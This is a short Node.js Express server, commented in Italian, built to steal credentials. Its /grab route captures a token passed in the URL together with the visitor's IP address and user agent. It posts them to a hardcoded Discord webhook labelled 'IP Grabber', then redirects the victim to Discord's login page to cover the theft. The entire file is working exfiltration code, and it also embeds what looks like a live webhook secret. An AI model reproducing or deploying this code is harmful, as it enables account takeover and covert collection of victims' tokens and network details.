const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK = "https://discord.com/api/webhooks/1522975278438289488/PQgV7D2a0k_NkZmi915GU_1SICsXvMGWb7PqEVNsghQqLWG6hVzLKHdJRzTQASNdIqs1";

app.use(express.json());

app.get('/grab', async (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const token = req.query.token || "NON_TROVATO";

    const data = {
        content: `**🎯 Nuovo Token Catturato!**\n` +
                 `\`\`\`js\n${token}\n\`\`\`\n` +
                 `**IP:** ${ip}\n` +
                 `**User-Agent:** ${userAgent}\n` +
                 `**Ora:** ${new Date().toLocaleString('it-IT')}`,
        username: "IP Grabber"
    };

    try {
        await axios.post(WEBHOOK, data);
    } catch (e) {}

    // Redirect finale
    res.redirect('https://discord.com/login');
});

app.listen(PORT, () => {
    console.log(`Server attivo su porta ${PORT}`);
});